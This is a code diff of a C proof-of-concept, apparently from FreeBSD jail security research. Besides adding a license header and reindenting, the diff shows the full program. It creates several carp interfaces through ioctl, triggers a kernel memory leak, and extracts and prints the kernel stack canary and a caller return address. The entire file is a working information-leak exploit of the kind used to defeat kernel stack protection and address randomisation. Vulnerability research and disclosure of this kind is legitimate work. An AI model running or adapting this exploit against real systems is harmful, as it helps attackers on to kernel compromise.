@@ -1,3 +1,12 @@
+/*
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (Revision 42):
+ * Ilja van Sprundel and Michael Smith wrote this file. As long as you retain
+ * this notice you can do whatever you want with this stuff. If we meet some
+ * day, and you think this stuff is worth it, you can buy us a beer in return
+ * ---------------------------------------------------------------------------
+ */
+
 #include <inttypes.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -22,66 +31,66 @@ kldload carp
 */
 
 int main(void) {
-    int sock;
-    struct carpreq carpr_set;
-    struct carpreq carpr_get[NUM_CARP_IFS];
-    struct ifreq ifr_set;
-    struct ifreq ifr_get;
+  int sock;
+  struct carpreq carpr_set;
+  struct carpreq carpr_get[NUM_CARP_IFS];
+  struct ifreq ifr_set;
+  struct ifreq ifr_get;
 
-    bzero(&carpr_set, sizeof(struct carpreq));
-    bzero(carpr_get, sizeof(carpr_get));
+  bzero(&carpr_set, sizeof(struct carpreq));
+  bzero(carpr_get, sizeof(carpr_get));
 
-    ifr_get.ifr_data = (caddr_t)&carpr_get;
-    ifr_set.ifr_data = (caddr_t)&carpr_set;
+  ifr_get.ifr_data = (caddr_t)&carpr_get;
+  ifr_set.ifr_data = (caddr_t)&carpr_set;
 
-    carpr_get[0].carpr_vhid = 0; // Instruct kernel we want info on all carp interfaces
-    carpr_get[0].carpr_count = NUM_CARP_IFS;
+  carpr_get[0].carpr_vhid = 0;  // Instruct kernel we want info on all carp interfaces
+  carpr_get[0].carpr_count = NUM_CARP_IFS;
 
-    strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
-    strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));
+  strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
+  strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));
 
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        exit(1);
+  sock = socket(AF_INET, SOCK_DGRAM, 0);
+  if (sock < 0) {
+    perror("socket");
+    exit(1);
+  }
+
+  // Create some carp interfaces.
+  // We need more than one carp interface defined on one physical interface to force the kernel to trigger the
+  // implementation bug that causes the memory leak.
+  // See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
+  //
+  // NOTE(m): Defining multiple carp interfaces on one physical interface does not seem possible using `ifconfig(8)`,
+  // either by design or because of a subtle locking bug (see
+  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
+  for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
+    carpr_set.carpr_vhid = i;
+    if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
+      perror("ioctl");
+      exit(1);
     }
+  }
 
-    // Create some carp interfaces.
-    // We need more than one carp interface defined on one physical interface to force the kernel to trigger the
-    // implementation bug that causes the memory leak.
-    // See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
-    //
-    // NOTE(m): Defining multiple carp interfaces on one physical interface does not seem possible using `ifconfig(8)`,
-    // either by design or because of a subtle locking bug (see
-    // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
-    for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
-        carpr_set.carpr_vhid = i;
-        if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
-            perror("ioctl");
-            exit(1);
-        }
-    }
+  // Enumerate the carp interfaces...
+  // and leak some kernel memory while we're at it
+  if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
+    perror("ioctl");
+    exit(1);
+  }
 
-    // Enumerate the carp interfaces...
-    // and leak some kernel memory while we're at it
-    if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
-        perror("ioctl");
-        exit(1);
-    }
+  // Extract the interesting bits from the leaked kernel memory
+  const unsigned char* base = (const unsigned char*)carpr_get;  // start of the buffer
+  uint64_t stack_cookie, caller_addr;
 
-    // Extract the interesting bits from the leaked kernel memory
-    const unsigned char *base = (const unsigned char *)carpr_get;  // start of the buffer
-    uint64_t stack_cookie, caller_addr;
+  size_t offset_stack_cookie = sizeof(struct carpreq);          // start of carpr_get[1]
+  size_t offset_caller_addr = sizeof(struct carpreq) * 2 + 16;  // 16 bytes into carpr_get[2]
 
-    size_t offset_stack_cookie = sizeof(struct carpreq);  // start of carpr_get[1]
-    size_t offset_caller_addr  = sizeof(struct carpreq) * 2 + 16;  // 16 bytes into carpr_get[2]
+  memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
+  memcpy(&caller_addr, base + offset_caller_addr, sizeof(caller_addr));
 
-    memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
-    memcpy(&caller_addr, base + offset_caller_addr, sizeof(caller_addr));
+  printf("\nSTACK COOKIE / CANARY:  0x%016" PRIx64 "\n", stack_cookie);
+  printf("\nCALLER ADDRESS: 0x%016" PRIx64 "\n\n", caller_addr);
 
-    printf("\nSTACK COOKIE / CANARY:  0x%016" PRIx64 "\n", stack_cookie);
-    printf("\nCALLER ADDRESS: 0x%016" PRIx64 "\n\n", caller_addr);
-
-    close(sock);
-    return 0;
+  close(sock);
+  return 0;
 }
